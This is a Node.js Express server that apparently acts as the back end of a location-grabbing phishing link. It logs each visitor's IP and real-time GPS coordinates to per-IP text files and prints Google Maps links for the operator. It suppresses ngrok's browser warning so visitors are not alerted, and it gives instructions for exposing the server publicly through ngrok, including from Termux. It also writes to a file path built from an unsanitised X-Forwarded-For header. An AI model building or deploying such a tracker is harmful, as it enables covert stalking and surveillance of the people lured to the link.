import express from 'express';
import path from 'path';
import bodyParser from 'body-parser';
import fs from 'fs';
import moment from 'moment';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import chalk from 'chalk';  // Importing chalk for colored console output

const app = express();
const port = 3000;

// Get __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Add middleware to send the ngrok header for skipping the warning page
app.use((req, res, next) => {
    res.setHeader('ngrok-skip-browser-warning', 'true'); // This will bypass the ngrok warning
    next();
});

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to get the user's IP address
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(/, /)[0] : req.connection.remoteAddress;

    // Handle localhost IP addresses
    if (ip === '::1' || ip === '127.0.0.1') {
        return 'localhost';
    }

    return ip;
}

// Helper function to convert Latitude/Longitude to DMM format
function convertToDMM(decimalDegrees) {
    const degrees = Math.floor(decimalDegrees);
    const minutes = ((decimalDegrees - degrees) * 60).toFixed(4);
    return `${degrees}°${minutes}'`;
}

// Function to save location data in DMM format in a .txt file
function saveLocationInTxt(ip, latitude, longitude) {
    const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
    const latDMM = convertToDMM(latitude);
    const lonDMM = convertToDMM(longitude);
    const locationData = `Date: ${timestamp}, Latitude: ${latDMM}, Longitude: ${lonDMM}\n`;

    const filePath = path.join(__dirname, `locations/${ip}.txt`);

    // Append location data to the text file
    fs.appendFile(filePath, locationData, (err) => {
        if (err) {
            console.error("Error writing to the text file:", err);
        } else {
            // Print location update and Google Maps link with color
            console.log(chalk.green(`Location updated for IP: `) + chalk.red(ip));
            console.log(chalk.green(`Google Maps Link: `) + chalk.blue(`https://www.google.com/maps/place/${latDMM}+${lonDMM}`));
        }
    });
}

// Route to handle receiving the location data from the frontend
app.post('/location', (req, res) => {
    const { latitude, longitude } = req.body;
    const ip = getClientIp(req);

    console.log(`Real-Time User Location: Latitude: ${latitude}, Longitude: ${longitude}, IP: ${ip}`);

    // Save the location data to a text file in DMM format
    saveLocationInTxt(ip, latitude, longitude);

    // Respond back to the client with confirmation
    res.json({ status: 'Location received and saved', latitude, longitude });
});

// Start the server
app.listen(port, () => {
    console.log(chalk.green(`[0] Server is running at http://localhost:${port}`));
    console.log(chalk.green(`[1] To get public link open a new terminal and start ngrok by\n => `)+chalk.blue(`./ngrok http ${port}`));
    console.log(chalk.red(`[!] Note : If you are using Termux than turn on hotspot to start ngrok.`));
});
